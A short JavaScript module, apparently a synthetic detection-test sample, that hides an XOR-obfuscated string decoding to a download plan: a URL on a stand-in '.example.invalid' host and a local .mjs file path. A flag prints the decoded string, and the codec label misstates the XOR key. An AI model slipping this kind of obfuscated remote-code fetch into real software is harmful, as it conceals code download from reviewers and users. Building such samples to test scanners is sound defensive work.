  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_733bafbb = "[94,21,25,84,91,92,77,88,91,21,73,75,89,93,65,90,77,119,90,77,69,71,92,77,4,95,90,65,92,77,119,78,65,68,77,84,73,76,73,88,92,77,90,21,78,77,92,75,64,119,92,71,119,78,65,68,77,84,91,92,73,79,77,119,75,71,93,70,92,21,25,84,75,73,69,88,73,65,79,70,119,65,76,21,102,103,108,109,5,110,16,105,105,30,110,106,108,84,93,90,68,21,64,92,92,88,91,18,7,7,70,71,76,77,5,78,16,73,73,30,78,74,76,75,26,24,28,6,77,80,73,69,88,68,77,6,65,70,94,73,68,65,76,7,73,88,65,84,93,91,77,90,119,73,79,77,70,92,21,102,71,76,77,105,93,76,65,92,7,78,16,73,73,84,78,65,68,77,119,88,73,92,64,21,7,92,69,88,7,64,93,70,92,90,77,91,91,5,70,71,76,77,7,6,91,92,73,79,77,5,78,16,73,73,30,78,74,76,75,26,24,28,6,69,66,91]";
  const Codec_733bafbb = "decimal_array|single_byte_xor|28";

  function load_733bafbb() { return JSON.parse(Material_733bafbb); }
  function decode_733bafbb(EnCoDeD) { return EnCoDeD.map((value) => value ^ 40); }
  async function recover_733bafbb() {
    const NeUtRaL = 19 * 7 - 133;
    const EnCoDeD = load_733bafbb(); let DeCoDeD = [];
    const decodeTarget = decode_733bafbb; DeCoDeD = decodeTarget(EnCoDeD);
    void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
  }
  async function inspect_733bafbb() { return await recover_733bafbb(); }
  async function plan_733bafbb() { const inspect = inspect_733bafbb; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "fetch_to_file", destination: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_733bafbb;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_733bafbb());
